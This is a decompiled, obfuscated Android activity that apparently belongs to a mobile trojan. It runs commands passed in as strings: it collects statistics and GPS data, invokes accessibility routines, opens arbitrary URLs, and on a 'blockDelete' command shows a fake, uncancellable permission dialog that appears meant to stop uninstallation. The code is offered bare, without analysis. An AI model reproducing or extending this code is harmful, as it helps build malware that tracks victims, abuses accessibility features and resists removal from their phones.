package wocwvy.czyxoxmbauu.slsa.ncec;

import android.app.Activity;
import android.app.AlertDialog;
import android.content.DialogInterface;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import wocwvy.czyxoxmbauu.slsa.C0020b;
import wocwvy.czyxoxmbauu.slsa.R;

/* JADX INFO: loaded from: classes.dex */
public class dzudmx extends Activity {
    @Override // android.app.Activity
    protected void onCreate(Bundle bundle) {
        String str;
        super.onCreate(bundle);
        C0020b c0020b = new C0020b();
        String stringExtra = getIntent().getStringExtra("start");
        if (stringExtra.contains("statistic")) {
            str = "statistic";
        } else {
            if (!stringExtra.contains("gps")) {
                if (stringExtra.contains("deleteApp")) {
                    startActivity(new Intent("android.settings.APPLICATION_DETAILS_SETTINGS", Uri.parse("package:" + getPackageName())));
                    return;
                }
                try {
                    if (stringExtra.contains("accessibility")) {
                        c0020b.m249d(this, "accessibility");
                        return;
                    }
                    if (stringExtra.contains("blockDelete")) {
                        AlertDialog.Builder builder = new AlertDialog.Builder(this);
                        builder.setTitle("Sorry!").setMessage("You have no permission to use this app!").setIcon(R.drawable.im).setCancelable(false).setNegativeButton("ОК", new DialogInterface.OnClickListener() { // from class: wocwvy.czyxoxmbauu.slsa.ncec.dzudmx.1
                            @Override // android.content.DialogInterface.OnClickListener
                            public void onClick(DialogInterface dialogInterface, int i) {
                                dzudmx.this.finish();
                            }
                        });
                        builder.create().show();
                        return;
                    } else {
                        if (stringExtra.contains("**startbrurl**")) {
                            startActivity(new Intent("android.intent.action.VIEW", Uri.parse(stringExtra.replace("**startbrurl**", ""))));
                            return;
                        }
                        return;
                    }
                } catch (Exception unused) {
                    return;
                }
            }
            str = "gps";
        }
        c0020b.m249d(this, str);
    }
}
